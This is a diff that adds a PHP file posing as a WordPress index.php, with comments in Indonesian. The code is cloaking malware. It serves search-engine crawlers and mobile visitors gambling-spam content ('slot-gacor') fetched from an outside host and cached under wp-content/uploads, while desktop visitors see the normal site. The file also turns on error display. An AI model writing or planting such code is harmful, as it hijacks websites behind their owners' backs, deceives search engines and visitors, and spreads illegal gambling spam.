@@ -1,0 +1,88 @@
+<?php
+// Aktifkan error reporting untuk debugging
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// Fungsi deteksi perangkat mobile
+function is_mobile_device($user_agent) {
+    $mobile_agents = ['Android', 'iPhone', 'iPod', 'iPad', 'Windows Phone', 'webOS', 'BlackBerry', 'Opera Mini', 'IEMobile'];
+    foreach ($mobile_agents as $agent) {
+        if (stripos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Fungsi deteksi bot
+function is_bot($user_agent) {
+    $bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'];
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Dapatkan user agent
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+// URL sumber konten eksternal
+$external_url = "https://added-cloud.cc/packdol/getcontent/prokaltim/slot-gacor.txt";
+
+// Path file cache
+$cache_file = __DIR__ . '/wp-content/uploads/wpcode/cache/slot-gacor.html';
+$cache_time = 1800; // 30 menit
+
+// Fungsi mengambil konten dari URL eksternal
+function get_external_content($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    return ($http_code === 200 && !empty($content)) ? $content : false;
+}
+
+// Fungsi mengambil konten cache atau unduh dari URL
+function get_cached_content($cache_file, $cache_time, $url) {
+    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
+        return file_get_contents($cache_file);
+    }
+
+    $content = get_external_content($url);
+    if ($content !== false) {
+        // Pastikan direktori cache ada
+        $dir = dirname($cache_file);
+        if (!is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+        file_put_contents($cache_file, $content);
+        return $content;
+    }
+
+    return false;
+}
+
+// Logic utama
+if (is_bot($user_agent) || is_mobile_device($user_agent)) {
+    $content = get_cached_content($cache_file, $cache_time, $external_url);
+    if ($content !== false) {
+        echo $content;
+    } else {
+        echo "<!-- Gagal mengambil konten eksternal -->";
+    }
+} else {
+    // Pastikan file WordPress utama ada
+    $wp_header = __DIR__ . '/wp-blog-header.php';
+    if (file_exists($wp_header)) {
+        require $wp_header;
+    } else {
+        echo "<!-- wp-blog-header.php tidak ditemukan -->";
+    }
+}
+?>
